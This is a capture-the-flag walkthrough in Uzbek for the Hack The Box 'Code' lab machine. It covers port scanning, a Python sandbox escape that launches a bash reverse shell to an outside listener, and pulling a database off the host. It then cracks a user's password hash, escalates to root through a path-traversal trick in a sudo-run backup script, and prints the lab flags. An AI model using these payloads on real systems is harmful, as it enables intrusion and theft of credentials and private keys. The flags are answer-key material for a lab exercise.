# Code
Link: https://app.hackthebox.com/machines/Code

# Razvetka
Port Scanning:
```
┌─[✗]─[me262@parrot]─[~/Downloads]
└──╼ $nmap -sV 10.10.11.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-19 14:49 +05
Nmap scan report for 10.10.11.62
Host is up (0.098s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.11 seconds
```

5000 portda veb interfeysli Python Online Compiler bor ekan, biz zararli kodni ishga tushirmqochimiz. 
Biroq yaxshi himoyalangan, **"Use of restricted keywords is not allowed."**.
Biroq ushbu kod orqali yechim oldim:
```
(1).__class__.__base__.__subclasses__()[317](
["bash", "-c", "bash -i >& /dev/tcp/10.10.14.39/4444 0>&1"]
)
```

Reverse shellni qabul qildim.
```
┌[parrot]─[15:28-19/07]─[/home/me262/Downloads]
└╼me262$nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.62 50124
bash: cannot set terminal process group (14409): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$ ls
ls
app.py
instance
__pycache__
static
templates
```

user.txt'ni qo'lga kiritish.
```
app-production@code:~/app$ cd ..
cd ..
app-production@code:~$ ls
ls
app
user.txt
app-production@code:~$ cat user.txt
cat user.txt
8d5d5e29c9c419d0388a5ed903c34a2c
app-production@code:~$ 
```
Bizda source code bor keling uni o'rganib chiqamiz.
Databasega  nazar solamiz.
```
app-production@code:~/app/instance$ ls
ls
database.db
```
Keling yuklab olamiz.
Server:
```
app-production@code:~/app/instance$ python3 -m http.server 8001
python3 -m http.server 8001
```
Hacker:
```
┌[parrot]─[15:41-19/07]─[/home/me262/HTB]
└╼me262$wget 10.10.11.62:8001/database.db
--2025-07-19 15:41:45--  http://10.10.11.62:8001/database.db
Connecting to 10.10.11.62:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16384 (16K) [application/octet-stream]
Saving to: ‘database.db’

database.db                                     100%[=====================================================================================================>]  16.00K  --.-KB/s    in 0.09s   

2025-07-19 15:41:46 (171 KB/s) - ‘database.db’ saved [16384/16384]
```
Ma'lumotlar bazasidan topilgan ma'lumot:
```
martin
3de6f30c4a09c27fc71932bfc68474be
```
Bizda parol hashi bor keling uni CrackStationdan sinab ko'ramiz.
Parol: nafeelswordsmaster
Ana endi martin useriga o'tamiz.
```
app-production@code:~/app$ su martin
su martin
Password: nafeelswordsmaster
python3 -c 'import pty; pty.spawn("/bin/bash")'

martin@code:/home/app-production/app$ 
```

# Privilage Escalation
Imkoniyatlar:
```
martin@code:~/backups$ sudo -l
sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Root.txt'ni olish

Keling /root papkasini ziplab o'zimizga olamiz.
```
martin@code:~$ cat task.json
{
        "destination": "/home/martin/",
        "multiprocessing": true,
        "verbose_log": true,
        "directories_to_archive": [
                "/home/....//root/"
        ]
}
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/07/19 11:18:57 🍀 backy 1.2
2025/07/19 11:18:57 📋 Working with task.json ...
2025/07/19 11:18:57 💤 Nothing to sync
2025/07/19 11:18:57 📤 Archiving: [/home/../root]
2025/07/19 11:18:57 📥 To: /home/martin ...
2025/07/19 11:18:57 📦
tar: Removing leading `/home/../' from member names
/home/../root/
/home/../root/.local/
/home/../root/.local/share/
/home/../root/.local/share/nano/
/home/../root/.local/share/nano/search_history
/home/../root/.selected_editor
/home/../root/.sqlite_history
/home/../root/.profile
/home/../root/scripts/
/home/../root/scripts/cleanup.sh
/home/../root/scripts/backups/
/home/../root/scripts/backups/task.json
/home/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
/home/../root/scripts/database.db
/home/../root/scripts/cleanup2.sh
/home/../root/.python_history
/home/../root/root.txt
/home/../root/.cache/
/home/../root/.cache/motd.legal-displayed
/home/../root/.ssh/
/home/../root/.ssh/id_rsa
/home/../root/.ssh/authorized_keys
/home/../root/.bash_history
/home/../root/.bashrc
```

Ushbu tar fayl paydo bo'ldi.
Uni endi ochib root.txt'ni o'qiymiz.
```
martin@code:~$ tar xvjf code_home_.._root_2025_July.tar.bz2
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
martin@code:~$ cat root/root.txt
f71692adb54649ff24bb7244f9e6745a
```

# Nafas olar ekanman, davom etaman...
